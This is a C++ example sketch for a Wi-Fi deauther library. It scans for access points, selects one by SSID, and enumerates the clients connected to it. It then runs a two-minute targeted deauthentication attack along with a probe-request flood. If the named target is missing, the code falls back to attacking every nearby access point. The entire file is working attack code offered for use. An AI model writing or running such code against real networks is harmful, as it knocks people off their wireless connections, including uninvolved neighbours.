/*
 * DeautherX-lib — Scan + Targeted Attack Example
 *
 * Scans for APs, finds one by name, scans its stations,
 * then starts a targeted deauth + probe attack.
 */

#include <DeautherLib.h>

DeautherScanner scanner;
DeautherAttack  attack;

// Change this to your target SSID
const char* TARGET_SSID = "MyTarget";

// Callback when a new AP is found during scan
void onAPFound(const DeautherAP& ap) {
    Serial.print(F("  Found AP: "));
    Serial.print(ap.getSSIDStr());
    Serial.print(F("  ch:"));
    Serial.print(ap.getChannel());
    Serial.print(F("  rssi:"));
    Serial.println(ap.getRSSI());
}

// Callback when a station is found
void onSTFound(const DeautherStation& st) {
    Serial.print(F("  Found Station: "));
    Serial.print(st.getMACStr());
    Serial.print(F("  -> "));
    Serial.println(st.getAPSSID());
}

void setup() {
    Serial.begin(115200);
    Serial.println(F("\n[ScanAndAttack] Starting..."));

    DSettingsManager::load();

    // Register callbacks
    scanner.onAPFound(onAPFound);
    scanner.onStationFound(onSTFound);

    // Phase 1: AP Scan
    Serial.println(F("\n--- Phase 1: Scanning for APs ---"));
    scanner.startAP();
    delay(4000);

    scanner.printAPs();

    // Find our target
    scanner.selectAPsBySSID(TARGET_SSID);
    int selected = scanner.getAPs().countSelected();
    Serial.print(F("Selected APs matching '")); Serial.print(TARGET_SSID);
    Serial.print(F("': ")); Serial.println(selected);

    if (selected == 0) {
        Serial.println(F("Target not found! Selecting all APs instead."));
        scanner.selectAllAPs();
    }

    // Phase 2: Station Scan (find clients on the target AP)
    Serial.println(F("\n--- Phase 2: Scanning for Stations (10s) ---"));
    ScanConfig stCfg;
    stCfg.timeout = 10000;
    scanner.startST(stCfg);

    // Wait for station scan + drive it via update()
    unsigned long start = millis();
    while (millis() - start < 10000) {
        scanner.update();
        delay(1);
    }
    scanner.stop();

    // Select stations associated with our target AP
    scanner.getAPs().begin();
    while (scanner.getAPs().available()) {
        DeautherAP* ap = scanner.getAPs().iterate();
        if (ap && ap->isSelected()) {
            scanner.selectStationsByBSSID(ap->getBSSID());
        }
    }
    scanner.printStations();

    // Phase 3: Build attack targets from selection
    Serial.println(F("\n--- Phase 3: Starting Attack ---"));

    DeauthConfig deauthCfg;
    deauthCfg.targets.fromSelection(scanner.getAPs(), scanner.getStations());
    deauthCfg.pkt_rate = 30;
    deauthCfg.timeout  = 120000; // 2 minutes

    // Also add probe flood
    ProbeConfig probeCfg;
    probeCfg.ssids.add(TARGET_SSID, true);
    probeCfg.ssids.add("Free WiFi Alternative", false);
    probeCfg.pkt_rate = 5;

    attack.start(&deauthCfg, nullptr, &probeCfg);

    Serial.print(F("Attack started with "));
    Serial.print(deauthCfg.targets.size());
    Serial.println(F(" deauth targets"));
}

void loop() {
    attack.update();

    static unsigned long last = 0;
    if (millis() - last > 2000) {
        attack.printStatus();
        last = millis();
    }

    // Auto-stop feedback
    if (!attack.isRunning()) {
        Serial.println(F("\n[ScanAndAttack] Attack finished."));
        while(true) delay(1000);
    }
}
